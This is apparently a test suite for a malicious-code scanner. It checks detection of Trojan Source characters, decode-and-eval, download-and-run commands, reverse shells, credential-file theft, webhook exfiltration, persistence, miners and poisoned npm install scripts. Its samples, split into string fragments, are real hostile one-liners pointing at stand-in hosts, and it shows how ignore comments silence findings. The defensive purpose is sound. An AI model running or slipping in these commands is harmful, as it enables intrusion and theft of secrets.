// veyra-guard-ignore-file: these tests contain sample attacks (assembled at runtime) on purpose.
import { test } from "node:test";
import assert from "node:assert/strict";
import { createRequire } from "node:module";
const g = createRequire(import.meta.url)("../out/scanner.js");

// Samples of malicious code are assembled from pieces so this file never contains a working payload.
const j = (...parts) => parts.join("");
const rules = (text, path = "src/index.js", opts) => g.scan(text, path, opts).map(f => f.rule);
const has = (text, rule, path) => assert.ok(rules(text, path).includes(rule), `expected ${rule} in ${JSON.stringify(text).slice(0, 120)}; got ${JSON.stringify(rules(text, path))}`);
const clean = (text, path) => assert.deepEqual(rules(text, path), [], `expected nothing in ${JSON.stringify(text).slice(0, 120)}`);

test("Trojan Source and invisible characters", () => {
  has(j('if (accessLevel != "user', "\u202E", ' \u2066// Check if admin\u2069 \u2066") {'), "trojan-source");
  has(j("const is", "\u200B", "Admin = true;"), "invisible-character");
  const f = g.scan(j("let a", "\u202E", "b = 1;"), "a.ts")[0];
  assert.equal(f.line, 1); assert.equal(f.column, 6);
  assert.match(f.message, /<U\+202E>/);
  clean("\uFEFFconst ok = 1; // a byte order mark at the very start is normal", "a.js");
  clean("Café, naïve, 日本語 and emoji 🚀 are fine in strings: 'déjà vu'", "a.js");
});

test("look-alike letters in names, but not in strings or comments", () => {
  has(j("function p", "\u0430", "ypal() { return send(); }"), "homoglyph");
  clean('const greeting = "Привет"; // Русский комментарий', "a.js");
  clean("const π = Math.PI;", "a.js");
});

test("code hidden far to the right", () => {
  has(j("const ok = true;", " ".repeat(180), "require('child_process').exec(x)"), "hidden-far-right");
  clean("const ok = true;   // a normal comment", "a.js");
});

test("decoding and running hidden code", () => {
  has(j("ev", "al(at", "ob('ZG9jdW1lbnQ='))"), "eval-decoded");
  has(j("new Func", "tion(Buffer.from(data, 'base", "64').toString())()"), "eval-decoded");
  has(j("ev", "al(String.fromCh", "arCode(97,108))"), "eval-decoded");
  has(j("ex", "ec(base64.b64de", "code(blob))"), "python-exec", "tool.py");
  has(j("__imp", "ort__('o", "s').sys", "tem('id')"), "python-exec", "tool.py");
  has(j("ev", "al(function(p,a,c,k,e,d){return 1})"), "packed-code");
  clean("const decoded = atob(token); JSON.parse(decoded);", "a.js");
  clean("setTimeout(() => render(), 100);", "a.js");
});

test("download-and-run, reverse shells, miners", () => {
  has(j("cu", "rl -fsSL http://example.test/i.sh | ba", "sh"), "download-execute", "setup.sh");
  has(j("powershell -c \"i", "ex (New-Object Net.Web", "Client).Download", "String('http://x.test/a')\""), "download-execute", "run.ps1");
  has(j("certu", "til -url", "cache -f http://x.test/a.exe a.exe"), "download-execute", "run.bat");
  has(j("bash -i >& /dev/", "tcp/203.0.113.5/4444 0>&1"), "reverse-shell", "x.sh");
  has(j("n", "c -e /bin/sh 203.0.113.5 4444"), "reverse-shell", "x.sh");
  has(j("pty.sp", "awn('/bin/bash')"), "reverse-shell", "x.py");
  has(j("const pool = 'stra", "tum+tcp://pool.example:3333';"), "crypto-miner");
  has(j("spawn('./x", "mrig', ['-o', pool]);"), "crypto-miner");
  clean("curl -fsSL https://example.com/data.json -o data.json", "fetch.sh");
  clean("Install with: curl -fsSL https://get.example.com | sh", "README.md");
});

test("stealing credentials and data", () => {
  has(j("fs.readFileSync(os.homedir() + '/.ss", "h/id_rsa')"), "credential-theft");
  has(j("const p = path.join(home, '.aws/credent", "ials');\nconst data = fs.readFileSync(p);"), "credential-theft");
  // Naming a sensitive path without reading it (a list of files to protect, a .gitignore) is fine.
  clean(j("const sensitive = ['.env', '.ss", "h/id_rsa', '.aws/credent", "ials'];\nassert(isSensitive(sensitive[1]));"), "a.js");
  clean(j("mkdir(base.join('.ss", "h'));"), "a.rs");
  has(j("fetch('https://discord.com/api/web", "hooks/123/abc', { method: 'POST' })"), "exfil-endpoint");
  has(j("requests.post('https://api.telegram.org/b", "ot123:abc/sendMessage', data=d)"), "exfil-endpoint", "x.py");
  has(j("body: JSON.stringify(process.", "env)"), "env-exfil");
  has(j("payload = json.dumps(dict(os.envi", "ron))"), "env-exfil", "x.py");
  clean("const port = process.env.PORT ?? 3000;", "a.js");
  clean("api_key = os.environ['API_KEY']", "a.py");
  clean(".npmrc\nnode_modules/", ".gitignore");
});

test("persistence and turning off defences", () => {
  has(j("(cron", "tab -l; echo '* * * * * /tmp/x') | cron", "tab -"), "persistence", "x.sh");
  has(j("scht", "asks /create /tn updater /tr C:\\x.exe /sc onlogon"), "persistence", "x.bat");
  has(j("echo 'curl x' >> ~/.bash", "rc"), "persistence", "x.sh");
  has(j("Set-MpPref", "erence -DisableRealtimeMonitoring $true"), "disable-defences", "x.ps1");
  has(j("power", "shell -w hidden -nop -c Get-Date"), "hidden-powershell", "x.bat");
  has(j("power", "shell -enc ", "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA"), "hidden-powershell", "x.bat");
  has("const agent = new https.Agent({ rejectUnauthorized: false });", "insecure-tls");
  clean("crontab -e opens your schedule", "notes.md");
});

test("obfuscation signals and bare IP addresses", () => {
  has(`const s = String.fromCharCode(${Array.from({ length: 20 }, (_, i) => 97 + i).join(",")});`, "char-code-obfuscation");
  has(`const s = "${"\\x41".repeat(30)}";`, "hex-escapes");
  has(`const blob = "${"QUJD".repeat(100)}";`, "base64-blob");
  has(j("fetch('http://198.51", ".100.7:8080/c')"), "raw-ip-url");
  clean("fetch('http://127.0.0.1:3000/api'); fetch('http://192.168.1.5/'); fetch('http://10.0.0.2')", "a.js");
  clean(`"integrity": "sha512-${"A".repeat(86)}=="`, "package-lock.json");
});

test("leaked secrets", () => {
  has(j("const key = 'AKI", "AQ4XN7ZK2PB9RW3TY';"), "secret");
  has(j("token = 'gh", "p_", "Zq8vT2mLx9Rk4Wn7Hc1Yb5Pd3Fg6Js0EaQuV", "'"), "secret");
  has(j("-----BEGIN RSA PRIV", "ATE KEY-----\n", "MIIEowIBAAKCAQEAu1SU1LfVLPHCozMxH2Mo4lgOEePzNm0tRgeLezV6ffAt0gun"), "secret", "deploy.pem.txt");
  // Samples and placeholders are not reported.
  clean(j("const key = 'AKI", "AIOSFODNN7EXAMPLE';"), "a.js");
  clean(j("token = 'gh", "p_", "a".repeat(36), "'"), "a.js");
  clean(j("token = 'gh", "p_", "abcdefghijklmnopqrstuvwxyz0123456789", "'"), "a.js");
  clean(j("assert(looksLikeSecret('-----BEGIN RSA PRIV", "ATE KEY-----'));"), "a.js");
  const f = g.scan(j("const key = 'AKI", "AQ4XN7ZK2PB9RW3TY';"), "a.js")[0];
  assert.ok(!f.message.includes("Q4XN7ZK2PB9RW3TY"), "the full secret is not repeated in the message");
  clean("const AKIA_PREFIX_DOCS = 'see the AWS docs';", "a.js");
});

test("poisoned npm install scripts", () => {
  const pkg = s => `{\n  "name": "x",\n  "scripts": {\n    ${s}\n  }\n}`;
  has(pkg(j('"postinstall": "cu', 'rl -s http://x.test/p | sh"')), "install-script", "package.json");
  has(pkg(j('"preinstall": "node -', 'e \\"require(\'child_process\')\\""')), "install-script", "package.json");
  assert.deepEqual(rules(pkg('"postinstall": "node scripts/build-native.js"'), "package.json"), ["install-hook"]);
  clean(pkg('"build": "tsc -p ."'), "package.json");
});

test("GitHub workflow attacks", () => {
  const wf = ".github/workflows/ci.yml";
  has(j("      - run: echo \"$", "{{ github.event.issue.title }}\""), "workflow-injection", wf);
  has(j("on: pull_request_target\njobs:\n  b:\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          ref: $", "{{ github.event.pull_request.head.sha }}"), "workflow-pr-target", wf);
  clean(j("on: pull_request\njobs:\n  b:\n    steps:\n      - run: echo \"$", "{{ github.sha }}\""), wf);
  assert.deepEqual(rules(j("run: echo $", "{{ github.event.issue.title }}"), "src/notes.yml"), [], "only workflow files");
});

test("lines can be marked as reviewed", () => {
  const bad = j("fetch('http://198.51", ".100.7/c')");
  assert.deepEqual(rules(`${bad} // veyra-guard-ignore`), []);
  assert.deepEqual(rules(`// veyra-guard-ignore: raw-ip-url\n${bad}`), []);
  assert.deepEqual(rules(`// veyra-guard-ignore: secret\n${bad}`), ["raw-ip-url"], "ignoring a different rule doesn't hide this one");
});

test("a whole file can opt out, but a pull request that adds an opt-out is reported", () => {
  const bad = j("fetch('http://198.51", ".100.7/c')");
  assert.deepEqual(rules(`// veyra-guard-ignore-file: sample attacks for tests\n${bad}`), []);
  assert.deepEqual(rules(`${bad}\n\n\n\n\n// veyra-guard-ignore-file`), ["raw-ip-url"], "only in the first five lines");
  // In a pull request (only new lines checked), adding an opt-out is itself a finding.
  assert.deepEqual(rules(`// veyra-guard-ignore-file\n${bad}`, "a.js", { onlyLines: new Set([1, 2]) }), ["guard-opt-out"]);
  assert.deepEqual(rules(`${bad} // veyra-guard-ignore`, "a.js", { onlyLines: new Set([1]) }), ["guard-opt-out"]);
  assert.deepEqual(rules(`${bad} // veyra-guard-ignore`, "a.js", { onlyLines: new Set([2]) }), [], "an opt-out that was already there isn't reported again");
});

test("byte order marks are not flagged", () => {
  clean(j("assert.deepEqual(parseCsv('", "﻿", "a,b'), [['a','b']]);"), "test/csv.test.js");
});

test("options: disabled rules, minimum severity, only some lines", () => {
  const text = [j("fetch('http://198.51", ".100.7/c')"), j("ev", "al(at", "ob(x))")].join("\n");
  assert.deepEqual(rules(text, "a.js", { disabled: ["raw-ip-url"] }), ["eval-decoded"]);
  assert.deepEqual(rules(text, "a.js", { minSeverity: "critical" }), ["eval-decoded"]);
  assert.deepEqual(rules(text, "a.js", { onlyLines: new Set([1]) }), ["raw-ip-url"]);
});

test("reads which lines a pull request adds", () => {
  const patch = "@@ -1,3 +1,4 @@\n line one\n-old two\n+new two\n+added three\n line four\n@@ -10,2 +11,2 @@\n context\n+late add";
  assert.deepEqual([...g.addedLines(patch)].sort((a, b) => a - b), [2, 3, 12]);
});

test("binary and huge files are skipped; every rule explains itself", () => {
  assert.deepEqual(g.scan("\u0000\u0001\u0002 binary " + j("stra", "tum+tcp://x"), "a.bin"), []);
  for (const r of g.ruleList()) { assert.ok(r.why.length > 40, `${r.id} explains why`); assert.ok(g.SEVERITIES.includes(r.severity)); }
  assert.equal(new Set(g.ruleList().map(r => r.id)).size, g.ruleList().length, "rule ids are unique");
});

test("hostile input can't freeze the scanner (no catastrophic backtracking)", () => {
  const nasty = [
    "'" + "\\".repeat(20000),                       // unclosed string full of backslashes
    "\"" + "\\\"".repeat(10000),                    // escaped quotes, never closed
    "x" + " ".repeat(15000) + "\t".repeat(5000),    // huge whitespace run with nothing after it
    "eval(" + "a".repeat(15000),
    "curl " + "a ".repeat(9000),
    "${{ github.event." + "x.".repeat(8000),
  ];
  for (const line of nasty) {
    const t = Date.now();
    g.scan(line, "src/a.js"); g.scan(line, ".github/workflows/x.yml"); g.scan(`{"scripts":{"postinstall":"${line.slice(0, 5000)}"}}`, "package.json");
    assert.ok(Date.now() - t < 1500, `took ${Date.now() - t}ms on ${JSON.stringify(line.slice(0, 20))}…`);
  }
});
